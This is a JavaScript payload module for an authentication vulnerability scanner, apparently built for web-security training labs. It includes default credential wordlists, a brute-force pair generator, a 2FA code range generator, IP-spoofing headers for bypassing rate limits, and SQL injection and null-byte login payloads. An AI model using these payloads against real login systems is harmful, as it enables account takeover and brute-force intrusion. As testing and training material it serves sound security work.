// Authentication Scanner Payloads
// Comprehensive payload database for authentication vulnerability testing

const AuthPayloads = {
    // Common usernames
    usernames: [
        'admin', 'administrator', 'root', 'user', 'test',
        'guest', 'info', 'adm', 'mysql', 'user1',
        'carlos', 'wiener', 'peter', 'carlos', 'administrator'
    ],

    // Common passwords
    passwords: [
        'password', '123456', 'admin', 'letmein', 'welcome',
        'monkey', 'dragon', 'master', 'qwerty', 'login',
        'password1', 'password123', 'abc123', 'admin123', 'root',
        'toor', 'pass', 'test', 'guest', '12345678',
        'montoya', 'peter', 'carlos', 'wiener'
    ],

    // 2FA bypass techniques
    twoFactorBypass: [
        { name: 'Skip 2FA page', technique: 'Navigate directly to authenticated page' },
        { name: 'Brute force code', technique: 'Try all 4-digit codes (0000-9999)' },
        { name: 'Response manipulation', technique: 'Change response from error to success' },
        { name: 'Reuse valid code', technique: 'Use code from another account' },
        { name: 'Race condition', technique: 'Submit multiple codes simultaneously' }
    ],

    // Password reset vulnerabilities
    passwordReset: [
        { name: 'Token in URL', technique: 'Reset token exposed in URL' },
        { name: 'Host header injection', technique: 'X-Forwarded-Host to capture token' },
        { name: 'Token predictability', technique: 'Weak or predictable tokens' },
        { name: 'Token reuse', technique: 'Token valid after password change' },
        { name: 'Username enumeration', technique: 'Different responses for valid/invalid users' }
    ],

    // Brute force techniques
    bruteForce: [
        { name: 'Credential stuffing', description: 'Test username:password pairs' },
        { name: 'Password spraying', description: 'One password against many users' },
        { name: 'Username enumeration', description: 'Identify valid usernames' },
        { name: 'Rate limit bypass', description: 'Bypass account lockout' },
        { name: 'IP rotation', description: 'Change IP to bypass blocks' }
    ],

    // Rate limit bypass headers
    rateLimitBypass: [
        'X-Forwarded-For: 127.0.0.1',
        'X-Forwarded-For: {{random_ip}}',
        'X-Originating-IP: 127.0.0.1',
        'X-Remote-IP: 127.0.0.1',
        'X-Client-IP: 127.0.0.1',
        'X-Real-IP: 127.0.0.1'
    ],

    // Stay logged in / Remember me
    stayLoggedIn: [
        { name: 'Cookie analysis', technique: 'Decode and analyze stay-logged-in cookie' },
        { name: 'Cookie forgery', technique: 'Craft valid cookie for target user' },
        { name: 'Brute force cookie', technique: 'Enumerate possible cookie values' }
    ],

    // Authentication logic flaws
    logicFlaws: [
        { name: 'Empty password', payload: '' },
        { name: 'SQL injection login', payload: "' OR '1'='1" },
        { name: 'Case manipulation', payload: 'ADMIN' },
        { name: 'Null byte injection', payload: 'admin%00' },
        { name: 'Unicode normalization', payload: 'aDmin' }
    ]
};

// 2FA codes for brute force
const TwoFactorCodes = {
    generateRange: (start, end) => {
        const codes = [];
        for (let i = start; i <= end; i++) {
            codes.push(i.toString().padStart(4, '0'));
        }
        return codes;
    },
    sample: ['0000', '1234', '4321', '9999', '0001', '1111', '2222']
};

// Helper functions
function getUsernames() {
    return AuthPayloads.usernames;
}

function getPasswords() {
    return AuthPayloads.passwords;
}

function get2FABypassTechniques() {
    return AuthPayloads.twoFactorBypass;
}

function getPasswordResetTechniques() {
    return AuthPayloads.passwordReset;
}

function getBruteForceCredentials() {
    const credentials = [];
    AuthPayloads.usernames.forEach(username => {
        AuthPayloads.passwords.forEach(password => {
            credentials.push({ username, password });
        });
    });
    return credentials;
}

function getPayloadCount() {
    return AuthPayloads.usernames.length +
        AuthPayloads.passwords.length +
        AuthPayloads.twoFactorBypass.length +
        AuthPayloads.passwordReset.length +
        AuthPayloads.bruteForce.length +
        AuthPayloads.rateLimitBypass.length +
        AuthPayloads.stayLoggedIn.length +
        AuthPayloads.logicFlaws.length;
}

function generateRandomIP() {
    return `${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}`;
}

// Export
if (typeof module !== 'undefined' && module.exports) {
    module.exports = {
        AuthPayloads,
        TwoFactorCodes,
        getUsernames,
        getPasswords,
        get2FABypassTechniques,
        getPasswordResetTechniques,
        getBruteForceCredentials,
        getPayloadCount,
        generateRandomIP
    };
}
